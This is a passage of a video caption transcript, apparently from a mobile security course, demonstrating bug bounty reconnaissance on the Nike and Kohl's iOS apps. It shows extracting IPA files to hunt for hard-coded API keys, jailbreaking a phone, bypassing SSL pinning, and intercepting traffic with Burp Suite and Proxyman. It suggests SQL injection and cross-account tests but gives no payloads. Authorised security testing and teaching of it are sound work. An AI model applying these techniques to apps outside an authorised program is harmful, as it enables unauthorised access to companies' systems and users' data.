00:03:45.780 --> 00:03:48.000
This will open the file in Xcode.

66
00:03:50.480 --> 00:03:57.680
Here's our iTunesMetadata.plist. Give me one second

67
00:03:57.680 --> 00:03:59.460
to drag that file over here.

68
00:04:00.500 --> 00:04:04.380
Here's our iTunesMetadata.plist. You can see it's

69
00:04:04.380 --> 00:04:09.180
got the Apple ID assigned to me, artist

70
00:04:09.180 --> 00:04:13.460
name, Nike, version number 2.185, some just

71
00:04:13.460 --> 00:04:14.920
general information here.

72
00:04:15.220 --> 00:04:17.320
The name of the application installed on my

73
00:04:17.320 --> 00:04:21.160
phone is com.nike.omega, so that's kind

74
00:04:21.160 --> 00:04:23.280
of interesting that it has a dot omega

75
00:04:23.280 --> 00:04:23.840
at the end.

76
00:04:25.040 --> 00:04:26.540
We can go to the MetaInf here, and

77
00:04:26.540 --> 00:04:29.040
we can look at like the metadata plist

78
00:04:29.040 --> 00:04:29.720
if we want to.

79
00:04:29.780 --> 00:04:31.300
I'm going to go to the payload folder

80
00:04:31.300 --> 00:04:31.680
here.

81
00:04:31.880 --> 00:04:34.500
We have the NikePlus.app. I'm going to

82
00:04:34.500 --> 00:04:37.820
click this and click show package contents, and

83
00:04:37.820 --> 00:04:40.460
this will actually open up the application itself.

84
00:04:40.940 --> 00:04:42.440
Let me blow up this window.

85
00:04:43.820 --> 00:04:46.560
So here is all of the things contained

86
00:04:46.560 --> 00:04:47.900
by the application.

87
00:04:48.720 --> 00:04:50.780
Of course, we want to go down and

88
00:04:50.780 --> 00:05:03.450
look through the info.plist here, wherever

89
00:05:03.450 --> 00:05:05.030
the file is.

90
00:05:05.990 --> 00:05:14.430
Here it is, info.plist. Let me drag

91
00:05:14.430 --> 00:05:15.790
this over to the other window.

92
00:05:20.860 --> 00:05:23.260
So this is our info.plist for this

93
00:05:23.260 --> 00:05:23.860
application.

94
00:05:25.120 --> 00:05:27.860
We would want to take a few moments

95
00:05:27.860 --> 00:05:30.100
and actually look through this file, of course,

96
00:05:30.360 --> 00:05:33.460
for anything that might be interesting, such as

97
00:05:33.460 --> 00:05:38.160
any URLs, API keys, anything in here.

98
00:05:51.440 --> 00:05:55.540
You possibly like mynike.com or anything like

99
00:05:55.540 --> 00:05:57.180
that that you might sign into to get

100
00:05:57.180 --> 00:05:58.400
access to your account.

101
00:05:59.460 --> 00:06:02.060
You can look through this entire file and

102
00:06:02.060 --> 00:06:04.500
see anything that might be hard-coded in

103
00:06:04.500 --> 00:06:10.180
here in terms of API keys, IDs, URLs,

104
00:06:10.480 --> 00:06:11.420
anything like that.

105
00:06:14.440 --> 00:06:16.780
Also want to look at this adb-mobile

106
00:06:16.780 --> 00:06:19.480
-config.json. I've seen these kind of files

107
00:06:19.480 --> 00:06:21.300
in multiple different applications.

108
00:06:22.280 --> 00:06:24.500
It's quite an interesting file and can sometimes

109
00:06:24.500 --> 00:06:26.600
have some very interesting things in here.

110
00:06:26.780 --> 00:06:28.760
So we can see that we have a

111
00:06:28.760 --> 00:06:30.160
marketing cloud org.

112
00:06:30.280 --> 00:06:32.180
This is like where they have Adobe cloud

113
00:06:32.180 --> 00:06:34.640
monitoring for the application.

114
00:06:37.150 --> 00:06:39.630
Some things like assets related to Adobe, so

115
00:06:39.630 --> 00:06:41.590
you know that you're using something with Adobe

116
00:06:41.590 --> 00:06:42.690
for this application.

117
00:06:45.800 --> 00:06:48.800
Going back to our file structure here, close

118
00:06:48.800 --> 00:06:49.600
some of these windows.

119
00:06:50.340 --> 00:06:51.940
Obviously, you want to take more time than

120
00:06:51.940 --> 00:06:53.960
this to actually look through these files and

121
00:06:53.960 --> 00:06:54.780
everything like that.

122
00:06:55.860 --> 00:06:57.620
So you can see there's like a bravo

123
00:06:57.620 --> 00:07:01.320
-config.json, alpha-config.json. You would want

124
00:07:01.320 --> 00:07:03.620
to look through all of these .json files

125
00:07:03.620 --> 00:07:03.940
here.

126
00:07:04.340 --> 00:07:06.760
This might be data that is used by

127
00:07:06.760 --> 00:07:09.420
the application for the UI or could also

128
00:07:09.420 --> 00:07:11.840
contain things like URLs that might be reaching

129
00:07:11.840 --> 00:07:12.580
out to you.

130
00:07:12.740 --> 00:07:16.140
You have omega-configurations.plist here, some different

131
00:07:16.140 --> 00:07:16.880
plist files.

132
00:07:17.300 --> 00:07:18.620
You want to look through all of these.

133
00:07:18.740 --> 00:07:22.380
Obviously, the on-demand-resources.plist, the .json

134
00:07:22.380 --> 00:07:25.600
files here, and these additional plists as well

135
00:07:25.600 --> 00:07:27.360
to look for anything that might be hard

136
00:07:27.360 --> 00:07:29.120
-coded into the application.

137
00:07:30.480 --> 00:07:32.600
You also want to look through some of

138
00:07:32.600 --> 00:07:34.560
these other files here.

139
00:07:34.640 --> 00:07:36.840
So you can see like info-plist.strings.

140
00:07:36.980 --> 00:07:38.020
Who knows what's in here.

141
00:07:38.380 --> 00:07:39.620
Let's just take a look.

142
00:07:40.500 --> 00:07:42.420
Looks like there's some kind of strings in

143
00:07:42.420 --> 00:07:42.800
here.

144
00:07:43.240 --> 00:07:45.400
This might be useful, might not be.

145
00:07:49.620 --> 00:07:51.500
So basically you would want to look through

146
00:07:51.500 --> 00:07:54.120
every single one of these .json files, try

147
00:07:54.120 --> 00:07:56.860
to find things like URLs, hard-coded strings,

148
00:07:57.320 --> 00:08:00.560
hard-coded API keys, the firebase databases, etc.

149
00:08:00.800 --> 00:08:03.040
Pretty similar to what we did with Android

150
00:08:03.040 --> 00:08:03.720
as well.

151
00:08:04.220 --> 00:08:06.320
Go to the sc-info here.

152
00:08:06.440 --> 00:08:08.660
You can always look through the manifest.plist

153
00:08:08.660 --> 00:08:09.200
as well.

154
00:08:09.320 --> 00:08:11.960
This can sometimes have interesting things in it

155
00:08:11.960 --> 00:08:13.220
like I talked about before.

156
00:08:14.640 --> 00:08:17.460
Looks like some replication paths for frameworks and

157
00:08:17.460 --> 00:08:18.600
things like that.

158
00:08:21.300 --> 00:08:23.320
So you just want to go through everything

159
00:08:23.320 --> 00:08:24.860
all at once.

160
00:08:24.960 --> 00:08:26.340
Maybe you look through some of these files

161
00:08:26.340 --> 00:08:27.540
for strings, etc.

162
00:08:27.880 --> 00:08:31.059
You can also take the IPA and put

163
00:08:31.059 --> 00:08:33.960
it through mobSF as well, which might also

164
00:08:33.960 --> 00:08:36.120
help to point you towards certain things.

165
00:08:36.679 --> 00:08:38.659
So now how would we actually do the

166
00:08:38.659 --> 00:08:41.900
dynamic analysis part of this process?

167
00:08:42.419 --> 00:08:44.960
Well, let me hop over to the iPhone

168
00:08:44.960 --> 00:08:47.240
now and just show you how we would

169
00:08:47.240 --> 00:08:52.100
set up everything to utilize, to utilize like

170
00:08:52.100 --> 00:08:54.980
SSL killchain for an application like this.

171
00:08:55.240 --> 00:08:56.780
First of all, I just want to see

172
00:08:56.780 --> 00:08:58.540
if the application is going to run.

173
00:08:59.660 --> 00:09:01.040
And click Nike here.

174
00:09:01.800 --> 00:09:04.420
Looks like everything works properly.

175
00:09:04.740 --> 00:09:07.940
So now you could potentially make yourself a

176
00:09:07.940 --> 00:09:08.640
few accounts.

177
00:09:08.840 --> 00:09:11.020
So like you could sign in here.

178
00:09:12.360 --> 00:09:15.120
Looks like it brings up accounts.nike.com.

179
00:09:15.220 --> 00:09:17.440
So we can already see that, for example,

180
00:09:17.600 --> 00:09:20.340
this accounts.nike.com is a new target

181
00:09:20.340 --> 00:09:22.260
for us in terms of where we'd sign

182
00:09:22.260 --> 00:09:23.260
in for the application.

183
00:09:23.900 --> 00:09:25.560
You can also click the join us link

184
00:09:25.560 --> 00:09:25.960
here.

185
00:09:26.080 --> 00:09:29.480
You can see that we're now going to

186
00:09:29.480 --> 00:09:31.740
accounts.nike.com and signing up with an

187
00:09:31.740 --> 00:09:31.980
email.

188
00:09:31.980 --> 00:09:34.260
So at this point I would be making

189
00:09:34.260 --> 00:09:35.880
a few different accounts to be able to

190
00:09:35.880 --> 00:09:36.600
test with.

191
00:09:37.040 --> 00:09:39.480
I would make like one account to see

192
00:09:39.480 --> 00:09:41.040
if I'll be able to get access to

193
00:09:41.040 --> 00:09:43.380
another account and use a couple burner emails

194
00:09:43.380 --> 00:09:44.680
for that kind of a thing.

195
00:09:45.020 --> 00:09:46.760
So I'd have two different accounts to be

196
00:09:46.760 --> 00:09:48.900
able to attack myself and see if I

197
00:09:48.900 --> 00:09:50.620
can get access to either one of those

198
00:09:50.620 --> 00:09:53.440
accounts information from the other account.

199
00:09:53.700 --> 00:09:55.740
So it looks like this application works just

200
00:09:55.740 --> 00:09:57.540
fine on a jailbroken phone.

201
00:09:59.100 --> 00:10:01.480
Next we would want to jailbreak the phone

202
00:10:01.480 --> 00:10:04.600
again so that we can actually intercept the

203
00:10:04.600 --> 00:10:06.100
traffic with burp suite.

204
00:10:06.320 --> 00:10:07.340
So let's do that now.

205
00:10:08.400 --> 00:10:10.420
It's going to open up check rain here

206
00:10:10.420 --> 00:10:14.060
and just jailbreak my phone again because every

207
00:10:14.060 --> 00:10:15.640
time you do this when you restart the

208
00:10:15.640 --> 00:10:17.120
phone and everything you're going to have to

209
00:10:17.120 --> 00:10:18.200
jailbreak it again.

210
00:10:18.640 --> 00:10:20.160
So I'm going to just do this really

211
00:10:20.160 --> 00:10:22.220
quickly to get my jailbreak up and running

212
00:10:25.190 --> 00:10:26.350
again.

213
00:10:26.350 --> 00:10:28.530
It's going to enter recovery mode here.

214
00:10:30.960 --> 00:10:32.440
It's going to say the device is in

215
00:10:32.440 --> 00:10:33.440
recovery mode.

216
00:10:33.540 --> 00:10:36.000
I'm going to click start here, hold down

217
00:10:36.000 --> 00:10:40.890
the buttons, release the power button, keep on

218
00:10:40.890 --> 00:10:42.190
holding down the side button.

219
00:10:42.310 --> 00:10:43.750
It's going to start booting up again.

220
00:10:48.660 --> 00:10:51.180
Okay now it's actually booting into the jailbreak

221
00:10:51.180 --> 00:10:55.180
here and in just a second the iPhone

222
00:10:55.180 --> 00:10:57.220
will populate back up under the screen once

223
00:10:57.220 --> 00:10:59.560
I get logged in and everything works successfully.

224
00:10:59.960 --> 00:11:02.480
So I'm booting up now into my jailbreak.

225
00:11:20.210 --> 00:11:25.700
Okay the phone should be appearing back on

226
00:11:25.700 --> 00:11:26.540
the screen here.

227
00:11:28.900 --> 00:11:30.080
Okay there it is.

228
00:11:30.360 --> 00:11:32.560
So now my phone is re-jailbroken.

229
00:11:32.880 --> 00:11:34.580
So now I want to set up burp

230
00:11:34.580 --> 00:11:36.100
suite to intercept the traffic.

231
00:11:36.700 --> 00:11:38.780
Again I'm going to use burp suite community

232
00:11:38.780 --> 00:11:39.400
edition.

233
00:11:45.240 --> 00:11:47.100
I'm opening this up in my other window.

234
00:12:04.400 --> 00:12:06.720
It's taking just a moment to load burp

235
00:12:06.720 --> 00:12:07.320
suite up.

236
00:12:08.540 --> 00:12:10.680
In the meantime I'm also going to go

237
00:12:10.680 --> 00:12:15.500
to my phone's proxy settings here, go to

238
00:12:15.500 --> 00:12:21.050
wi-fi, go down to configure proxy, click

239
00:12:21.050 --> 00:12:21.570
manual.

240
00:12:22.710 --> 00:12:24.370
I'm going to put my IP address in

241
00:12:24.370 --> 00:12:25.470
there in just a second.

242
00:12:26.130 --> 00:12:28.350
Also opening burp suite up in the meantime.

243
00:12:32.640 --> 00:12:34.940
So again I'm going to do an ifconfig

244
00:12:34.940 --> 00:12:37.420
to get my IP address and fill those

245
00:12:37.420 --> 00:12:48.720
details in here in my phone and it

246
00:12:48.720 --> 00:12:53.340
looks like our IP is 192.168 and

247
00:12:57.730 --> 00:12:59.090
the port again is going to be 80

248
00:12:59.090 --> 00:13:00.990
.82. I don't have burp suite quite set

249
00:13:00.990 --> 00:13:02.710
up but in a minute it will be

250
00:13:02.710 --> 00:13:03.230
set up.

251
00:13:04.450 --> 00:13:06.590
Let me drag burp suite over here so

252
00:13:06.590 --> 00:13:07.770
you can actually see the setup.

253
00:13:19.850 --> 00:13:22.750
Okay so here's burp suite all started up

254
00:13:22.750 --> 00:13:25.230
and again I have to go to the

255
00:13:25.230 --> 00:13:29.430
proxy tab, go to options and add a

256
00:13:29.430 --> 00:13:33.490
new interface here for 80.82. The certificate

257
00:13:33.490 --> 00:13:35.130
and everything is already going to be trusted

258
00:13:35.130 --> 00:13:38.290
because we had this running previously.

259
00:13:39.130 --> 00:13:42.990
I need to select all interfaces here, click

260
00:13:42.990 --> 00:13:44.270
okay and yes.

261
00:13:45.050 --> 00:13:46.690
Then we're going to go to our proxy

262
00:13:46.690 --> 00:13:50.670
tab here and all right so now I'm

263
00:13:50.670 --> 00:13:52.250
going to open the Nike app.

264
00:13:54.880 --> 00:13:58.680
I'll click like join us here, see if

265
00:13:58.680 --> 00:14:00.800
we can actually intercept some of this traffic.

266
00:14:01.080 --> 00:14:02.840
Looks like it's not because I think I

267
00:14:02.840 --> 00:14:05.140
need to set up SSL kill chain again.

268
00:14:05.760 --> 00:14:08.840
Go down here to my settings, yep go

269
00:14:08.840 --> 00:14:11.020
to SSL kill switch and just toggle this

270
00:14:11.020 --> 00:14:11.700
on and off.

271
00:14:30.470 --> 00:14:32.070
I might have put in the wrong IP

272
00:14:32.070 --> 00:14:33.130
address here.

273
00:14:33.130 --> 00:14:36.410
Let me double check my proxy settings.

274
00:14:52.960 --> 00:14:55.100
Yep I have a nine, need a nine

275
00:14:55.100 --> 00:14:55.840
at the end here.

276
00:14:57.220 --> 00:14:58.100
There we go.

277
00:14:58.280 --> 00:15:00.160
Now I should start getting some traffic into

278
00:15:00.160 --> 00:15:00.680
burp suite.

279
00:15:01.560 --> 00:15:03.780
Yep so here now we can see api

280
00:15:03.780 --> 00:15:06.760
.nike.com so we're intercepting the traffic of

281
00:15:06.760 --> 00:15:08.320
this application successfully.

282
00:15:08.820 --> 00:15:10.360
Just forward some of this along.

283
00:15:11.780 --> 00:15:14.220
Again if we wanted to filter out some

284
00:15:14.220 --> 00:15:16.000
of this traffic we go to the target

285
00:15:16.000 --> 00:15:18.200
tab, go to scope here and we can

286
00:15:18.200 --> 00:15:20.000
start adding things into the scope.

287
00:15:20.160 --> 00:15:23.020
So like for example this api.nike.com,

288
00:15:23.120 --> 00:15:24.880
this would be one that we want to

289
00:15:24.880 --> 00:15:26.080
add to our scope here.

290
00:15:27.500 --> 00:15:31.240
You can also see that now the phone

291
00:15:31.240 --> 00:15:33.180
is saying it cannot open the page because

292
00:15:33.180 --> 00:15:34.720
the server is not responding.

293
00:15:34.860 --> 00:15:37.300
That's because I did not forward along all

294
00:15:37.300 --> 00:15:37.840
this traffic.

295
00:15:38.020 --> 00:15:39.980
So let me just turn my intercept off,

296
00:15:40.620 --> 00:15:42.760
click join us again, click continue and it

297
00:15:42.760 --> 00:15:44.720
should load up just fine and we should

298
00:15:44.720 --> 00:15:49.200
have these things captured here in our proxy

299
00:15:49.200 --> 00:15:50.280
settings as well.

300
00:15:50.880 --> 00:15:52.940
If I have my intercept on click join

301
00:15:52.940 --> 00:15:55.060
us we should see this nike stuff comp.

302
00:15:55.140 --> 00:15:56.980
Yeah like accounts.nike.com.

303
00:15:58.280 --> 00:16:00.540
This stuff is all being populated as part

304
00:16:00.540 --> 00:16:01.420
of that website.

305
00:16:01.700 --> 00:16:03.000
I'm going to forward some of this along.

306
00:16:03.580 --> 00:16:05.580
Yeah so you have all this accounts.nike

307
00:16:05.580 --> 00:16:06.480
.com stuff.

308
00:16:06.580 --> 00:16:07.980
This could be something that you want to

309
00:16:07.980 --> 00:16:10.200
try to manipulate, some of these parameters etc.

310
00:16:11.000 --> 00:16:13.200
You'd want to go through and you want

311
00:16:13.200 --> 00:16:14.380
to set up an account.

312
00:16:14.860 --> 00:16:16.780
Maybe you want to go ahead and test

313
00:16:16.780 --> 00:16:18.840
this stuff right, like the email and the

314
00:16:18.840 --> 00:16:19.240
password.

315
00:16:19.520 --> 00:16:21.460
So you could try some payloads like sql

316
00:16:21.460 --> 00:16:25.000
injection payloads or you could also like manipulate

317
00:16:25.000 --> 00:16:26.840
it in ways that maybe it's not intended

318
00:16:26.840 --> 00:16:27.280
to be.

319
00:16:27.620 --> 00:16:29.160
You could also try to like change the

320
00:16:29.160 --> 00:16:29.920
regions here.

321
00:16:30.340 --> 00:16:34.360
Maybe you want to like intercept this call

322
00:16:34.360 --> 00:16:37.760
here for the region and change that.

323
00:16:42.460 --> 00:16:43.480
Let's see if this will let me do

324
00:16:43.480 --> 00:16:43.940
that.

325
00:16:49.020 --> 00:16:51.320
Whatever data you'd be collecting out of these

326
00:16:51.320 --> 00:16:54.680
accounts and also you could obviously expand your

327
00:16:54.680 --> 00:16:57.800
scope to the actual accounts.nike.com website

328
00:16:57.800 --> 00:17:01.160
and once you actually create an account like

329
00:17:01.160 --> 00:17:02.960
say you do join us here.

330
00:17:03.460 --> 00:17:05.440
Turn my intercept off for a second.

331
00:17:05.800 --> 00:17:07.599
You'd sign up with your email address.

332
00:17:08.440 --> 00:17:10.560
Maybe it's one account and then you see

333
00:17:10.560 --> 00:17:13.880
how that authentication token is actually pushed back

334
00:17:13.880 --> 00:17:16.260
to the application here and then you can

335
00:17:16.260 --> 00:17:18.500
see what you get access to once you're

336
00:17:18.500 --> 00:17:19.140
authenticated.

337
00:17:19.599 --> 00:17:21.660
You can test the authentication tokens, you can

338
00:17:21.660 --> 00:17:23.960
test the different parts of the application that

339
00:17:23.960 --> 00:17:26.200
right now I do not have access to.

340
00:17:26.579 --> 00:17:28.080
So at this point I would sign up

341
00:17:28.080 --> 00:17:30.120
for two different accounts and I would do

342
00:17:30.120 --> 00:17:31.600
some testing to see if I can get

343
00:17:31.600 --> 00:17:33.880
access to the other account or anything like

344
00:17:33.880 --> 00:17:34.320
that.

345
00:17:34.600 --> 00:17:36.520
Test the different parts of the application, whatever

346
00:17:36.520 --> 00:17:39.140
becomes available after I sign up.

347
00:17:39.820 --> 00:17:41.500
So that's all I have for the live

348
00:17:41.500 --> 00:17:42.300
bug bounty hunt.

349
00:17:42.440 --> 00:17:43.800
I know we didn't go through like everything

350
00:17:43.800 --> 00:17:45.460
and sign up for an account and everything

351
00:17:45.460 --> 00:17:48.240
like that, but I wanted you to see

352
00:17:48.240 --> 00:17:50.620
the whole process from the beginning so we

353
00:17:50.620 --> 00:17:52.920
can see how we pull the application off

354
00:17:52.920 --> 00:17:55.220
the app store, how we get the application

355
00:17:55.220 --> 00:17:57.320
set up with burp suite and everything like

356
00:17:57.320 --> 00:17:57.620
that.

357
00:17:57.900 --> 00:18:00.440
Let's go ahead and download one more application

358
00:18:00.440 --> 00:18:02.380
to finish off the bug bounty section.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.010 --> 00:00:03.710
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, for our final bug bounty hunt, we're

2
00:00:03.710 --> 00:00:06.390
going to actually use proxy man here and

3
00:00:06.390 --> 00:00:08.830
my device here is already jailbroken.

4
00:00:09.130 --> 00:00:10.930
So I'm going to go to my settings

5
00:00:10.930 --> 00:00:12.970
real quick and just make sure that I

6
00:00:12.970 --> 00:00:14.930
have SSL kill switch installed.

7
00:00:15.390 --> 00:00:16.750
I'm just going to toggle this on and

8
00:00:16.750 --> 00:00:18.890
off to make sure that I'm breaking SSL

9
00:00:18.890 --> 00:00:19.310
pinning.

10
00:00:19.630 --> 00:00:21.290
Now I'm going to go to the Apple

11
00:00:21.290 --> 00:00:23.150
App Store here and this time we're going

12
00:00:23.150 --> 00:00:24.410
to do the Kohl's app.

13
00:00:24.490 --> 00:00:25.970
So I'm just going to click get here

14
00:00:25.970 --> 00:00:27.110
on the application.

15
00:00:27.790 --> 00:00:30.090
It's going to instal the application and ask

16
00:00:30.090 --> 00:00:32.130
for my Apple ID password.

17
00:00:33.510 --> 00:00:35.850
I'm going to sign in there and download

18
00:00:35.850 --> 00:00:36.690
this application.

19
00:00:39.040 --> 00:00:42.260
Now again, if we wanted to analyse this

20
00:00:42.260 --> 00:00:45.060
application locally, all we need to do is

21
00:00:45.060 --> 00:00:46.480
open AnyTrans here.

22
00:00:51.720 --> 00:00:54.300
Okay, so here's AnyTrans running on my MacBook.

23
00:00:54.780 --> 00:00:57.720
Looks like the Kohl's app has downloaded successfully.

24
00:01:00.260 --> 00:01:04.019
I'm going to just search here Kohl's in

25
00:01:04.019 --> 00:01:04.860
AnyTrans.

26
00:01:05.440 --> 00:01:07.600
I'm going to click download here and now

27
00:01:07.600 --> 00:01:09.560
I'll supply my Apple ID again.

28
00:01:11.120 --> 00:01:12.900
Okay, I'm going to click download here.

29
00:01:14.500 --> 00:01:16.380
It's now downloading the application.

30
00:01:17.960 --> 00:01:19.740
Okay, here it is downloading.

31
00:01:23.800 --> 00:01:25.300
Let me move the iPhone out of the

32
00:01:25.300 --> 00:01:25.940
way real quick.

33
00:01:29.900 --> 00:01:32.060
Okay, now I'm going to click to Mac

34
00:01:32.060 --> 00:01:37.040
here for the Kohl's app and I'm just

35
00:01:37.040 --> 00:01:39.420
going to save this into my documents folder.

36
00:01:39.620 --> 00:01:41.020
Actually, I'm going to make a brand new

37
00:01:41.020 --> 00:01:43.040
folder and just call this one Kohl's so

38
00:01:43.040 --> 00:01:43.900
we have this organised.

39
00:01:48.330 --> 00:01:50.430
Okay, and now it has downloaded the app.

40
00:01:50.510 --> 00:01:51.870
I'm going to click view files here on

41
00:01:51.870 --> 00:01:52.310
my MacBook.

42
00:01:56.460 --> 00:01:58.080
This will open it up in the finder

43
00:01:58.080 --> 00:01:58.520
window.

44
00:02:04.340 --> 00:02:06.400
Go to documents here.

45
00:02:06.400 --> 00:02:10.780
Go to the Kohl's folder and we have

46
00:02:10.780 --> 00:02:12.500
our new AnyTrans export here.

47
00:02:12.620 --> 00:02:14.180
So here's our IPA file.

48
00:02:14.600 --> 00:02:18.020
Again, we could just right click this, click

49
00:02:18.020 --> 00:02:18.440
duplicate.

50
00:02:20.910 --> 00:02:23.170
This will make a copy of the application.

51
00:02:23.490 --> 00:02:25.330
I'm going to rename this one to payload

52
00:02:25.330 --> 00:02:36.700
.zip and click

53
00:02:36.700 --> 00:02:37.300
use zip.

54
00:02:40.250 --> 00:02:42.910
Now we're going to open our new zip

55
00:02:42.910 --> 00:02:45.350
folder and take a look at everything that's

56
00:02:45.350 --> 00:02:45.890
in there.

57
00:02:56.100 --> 00:02:58.120
Okay, so here's our payload folder.

58
00:02:58.240 --> 00:02:59.080
I'm clicking there.

59
00:02:59.180 --> 00:03:02.540
Again, we have our iTunes metadata.plist. We

60
00:03:02.540 --> 00:03:03.840
have our meta info folder.

61
00:03:03.940 --> 00:03:05.180
We have our payload folder.

62
00:03:05.280 --> 00:03:07.160
I'm going to click payload and now I'm

63
00:03:07.160 --> 00:03:09.580
going to right click and click show package

64
00:03:09.580 --> 00:03:12.620
contents for the Kohl's app and this will

65
00:03:12.620 --> 00:03:15.220
open it up for our static analysis process.

66
00:03:16.140 --> 00:03:18.280
And there's, wow, there's tonnes of things in

67
00:03:18.280 --> 00:03:19.000
this application.

68
00:03:19.240 --> 00:03:20.860
Looks like a really big application.

69
00:03:21.580 --> 00:03:23.440
Again, we would want to take a look

70
00:03:23.440 --> 00:03:24.040
through all this.

71
00:03:24.080 --> 00:03:25.840
So now you can actually see the difference

72
00:03:25.840 --> 00:03:28.520
between the sizes of some of these applications.

73
00:03:29.020 --> 00:03:30.940
This one is obviously huge.

74
00:03:31.060 --> 00:03:34.500
There's some wallet certifications in here, certificates.

75
00:03:35.160 --> 00:03:38.020
We want to go find the info.plist

76
00:03:38.020 --> 00:03:38.420
here.

77
00:03:38.980 --> 00:03:40.900
You can see how the size of this

78
00:03:40.900 --> 00:03:42.960
application compares to other ones.

79
00:03:43.540 --> 00:03:46.020
There's also this interesting www folder.

80
00:03:46.200 --> 00:03:49.420
Maybe there is some interesting things in there.

81
00:03:49.520 --> 00:03:51.160
Let's actually take a look real quick.

82
00:03:51.760 --> 00:03:54.660
Looks like some different JavaScript things like that.

83
00:03:54.780 --> 00:03:57.760
Maybe they're running like a iframe kind of

84
00:03:57.760 --> 00:03:59.900
thing of certain parts of the website.

85
00:04:01.240 --> 00:04:04.660
Okay, we're back here in the kohl's.app

86
00:04:04.660 --> 00:04:05.780
here.

87
00:04:05.920 --> 00:04:07.120
We want to try to go down and

88
00:04:07.120 --> 00:04:09.280
find the info.plist. You can find some

89
00:04:09.280 --> 00:04:12.580
other plist files here and just keep scrolling

90
00:04:12.580 --> 00:04:13.560
down through this.

91
00:04:15.870 --> 00:04:18.510
So we have menu.json, some different plist

92
00:04:18.510 --> 00:04:19.029
files.

93
00:04:21.970 --> 00:04:23.250
Let's see if we can find the info

94
00:04:23.250 --> 00:04:29.230
.plist. It's probably near the top since this

95
00:04:29.230 --> 00:04:30.150
is alphabetical.

96
00:04:30.330 --> 00:04:33.130
There it is, info.plist. I'm just going

97
00:04:33.130 --> 00:04:34.670
to open this up real quick so we

98
00:04:34.670 --> 00:04:35.790
can just take a look together.

99
00:04:36.230 --> 00:04:38.810
Obviously this application is huge.

100
00:04:39.070 --> 00:04:40.410
We're going to have to go through a

101
00:04:40.410 --> 00:04:42.210
lot of these different folders and everything to

102
00:04:42.210 --> 00:04:43.410
see what is happening.

103
00:04:43.890 --> 00:04:46.970
There's some config files like config.xml here

104
00:04:46.970 --> 00:04:49.370
and very interesting things to take a look

105
00:04:49.370 --> 00:04:52.750
at from a static analysis process perspective.

106
00:04:53.170 --> 00:04:56.050
I'm opening this info.plist in xcode.

107
00:04:56.210 --> 00:04:59.750
Let me drag that over here to our

108
00:04:59.750 --> 00:05:00.190
folder.

109
00:05:02.800 --> 00:05:06.220
Okay, so here's our info.plist. You can

110
00:05:06.220 --> 00:05:09.240
see some Google API keys, some different app

111
00:05:09.240 --> 00:05:10.680
keys that are stored in here.

112
00:05:11.160 --> 00:05:13.520
Lots of different things in this info.plist.

113
00:05:13.540 --> 00:05:14.820
So you'd want to take a look through

114
00:05:14.820 --> 00:05:17.360
here, see if you can enumerate anything out

115
00:05:17.360 --> 00:05:17.820
of here.

116
00:05:18.240 --> 00:05:21.440
See this also d.us.criteo. That would

117
00:05:21.440 --> 00:05:22.880
be kind of out of scope since it's

118
00:05:22.880 --> 00:05:25.540
a different URL, but still something interesting to

119
00:05:25.540 --> 00:05:26.100
look at.

120
00:05:26.560 --> 00:05:29.020
So obviously this application is much bigger than

121
00:05:29.020 --> 00:05:30.940
the other one that we took a look

122
00:05:30.940 --> 00:05:34.540
at, but this is also interesting as well.

123
00:05:35.360 --> 00:05:38.720
All right, let's actually go over to our

124
00:05:38.720 --> 00:05:42.100
iPhone now and try to interact with the

125
00:05:42.100 --> 00:05:43.800
application and see what happens.

126
00:05:45.000 --> 00:05:47.380
So here I am on my iPhone and

127
00:05:47.380 --> 00:05:50.820
I'm just going to go to the Kohl's

128
00:05:50.820 --> 00:05:54.380
app here and we already have everything set

129
00:05:54.380 --> 00:05:55.500
up for our proxy.

130
00:05:55.840 --> 00:05:58.240
So we should start to see some traffic

131
00:05:58.240 --> 00:06:01.600
coming through here on ProxyMan.

132
00:06:01.660 --> 00:06:03.040
I'm going to scroll to the bottom and

133
00:06:03.040 --> 00:06:04.880
see if we can see anything coming in.

134
00:06:07.030 --> 00:06:09.190
I have some stuff for port 8082.

135
00:06:17.700 --> 00:06:25.500
I'm going to click cancel here, allow, and

136
00:06:25.500 --> 00:06:26.640
click agree here.

137
00:06:32.150 --> 00:06:33.490
I'm going to click continue here.

138
00:06:36.200 --> 00:06:37.860
Looks like it has some ability to use

139
00:06:37.860 --> 00:06:40.180
cookies here, which is interesting, allowing you to

140
00:06:40.180 --> 00:06:42.540
track activity across the company's app and website.

141
00:06:42.700 --> 00:06:43.760
I'm going to click allow on that.

142
00:06:44.140 --> 00:06:45.400
And here we can see that we can

143
00:06:45.400 --> 00:06:47.760
search for things like say jeans.

144
00:06:48.240 --> 00:06:51.120
Kohl's is a U.S. retailer that sells

145
00:06:51.120 --> 00:06:51.620
clothing.

146
00:06:51.900 --> 00:06:52.780
So here we go.

147
00:06:52.860 --> 00:06:54.380
We have lots of different jeans and stuff.

148
00:06:54.460 --> 00:06:56.500
So we know that we're intercepting the application

149
00:06:56.500 --> 00:06:57.640
traffic successfully.

150
00:06:57.920 --> 00:07:00.240
We can actually see some stuff coming through

151
00:07:00.240 --> 00:07:00.680
here.

152
00:07:01.720 --> 00:07:03.300
I don't know why we have this port

153
00:07:03.300 --> 00:07:05.040
8082 stuff.

154
00:07:06.480 --> 00:07:10.420
This might be because of mobile assistant.

155
00:07:10.540 --> 00:07:11.900
Let me make sure that's off.

156
00:07:19.020 --> 00:07:21.300
I don't have it installed, so I'm not

157
00:07:21.300 --> 00:07:22.540
sure what that all is about.

158
00:07:25.320 --> 00:07:27.080
But let's keep on going down here.

159
00:07:28.300 --> 00:07:31.840
See if we can see any URLs for

160
00:07:31.840 --> 00:07:32.940
kohl's.com.

161
00:07:33.120 --> 00:07:33.760
Yep, here we go.

162
00:07:33.860 --> 00:07:37.500
So we have like maps.kohl's.com, kohl's

163
00:07:37.500 --> 00:07:43.340
.sc.omtread. We can actually try to say

164
00:07:43.340 --> 00:07:46.920
search again and see if we can intercept

165
00:07:46.920 --> 00:07:47.700
this traffic.

166
00:07:47.880 --> 00:07:48.560
Click search.

167
00:07:50.120 --> 00:07:51.840
We can see this kohl's.com.

168
00:07:51.940 --> 00:07:53.940
I'm going to click enable only this domain.

169
00:07:54.120 --> 00:07:56.240
This is going to allow us to break

170
00:07:56.240 --> 00:07:57.300
the SSL pinning.

171
00:07:57.440 --> 00:07:59.060
I'm actually going to pin this one.

172
00:07:59.680 --> 00:08:00.760
So I'm going to pin this to my

173
